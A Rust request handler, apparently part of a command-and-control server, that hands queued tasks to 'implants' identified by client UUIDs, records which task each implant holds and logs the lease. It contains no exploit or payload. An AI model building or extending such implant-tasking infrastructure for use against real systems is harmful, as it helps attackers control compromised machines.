use std::{
    future::Future,
    io::{Error, ErrorKind},
    pin::Pin,
    str::FromStr,
    sync::Arc,
};

use hyper::StatusCode;
use serde_json::json;
use uuid::Uuid;

use crate::util::{
    activity::ActivitySeverity, app::ServerContext, packet::Packet, router::PacketReply,
    tasks::FetchTaskRequest,
};

pub fn handle(
    context: Arc<ServerContext>,
    packet: Packet,
) -> Pin<Box<dyn Future<Output = PacketReply> + Send>> {
    Box::pin(async move {
        match packet.parse_data::<FetchTaskRequest>() {
            Ok(request) => match parse_clientid(packet.clientid()) {
                Ok(clientid) => {
                    let response = context
                        .tasks()
                        .fetch_tasks(clientid, request.want.unwrap_or(1))
                        .await;
                    context
                        .implants()
                        .set_active_task(clientid, response.tasks.first().map(|task| task.task_id))
                        .await;
                    if let Some(task) = response.tasks.first() {
                        context
                            .record_activity(
                                ActivitySeverity::Info,
                                format!("leased {} for {}", task.task_type, clientid),
                                Some(clientid),
                                Some(task.task_id),
                            )
                            .await;
                    }

                    PacketReply::packet(
                        StatusCode::OK,
                        packet.opcode_kind(),
                        packet.clientid(),
                        &response,
                    )
                }
                Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
            },
            Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
        }
    })
}

fn parse_clientid(clientid: &str) -> Result<Uuid, Error> {
    Uuid::from_str(clientid).map_err(|e| Error::new(ErrorKind::InvalidInput, e.to_string()))
}

fn error_reply(packet: &Packet, status: StatusCode, message: &str) -> PacketReply {
    PacketReply::packet(
        status,
        packet.opcode_kind(),
        packet.clientid(),
        &json!({
            "status": "error",
            "message": message,
        }),
    )
}
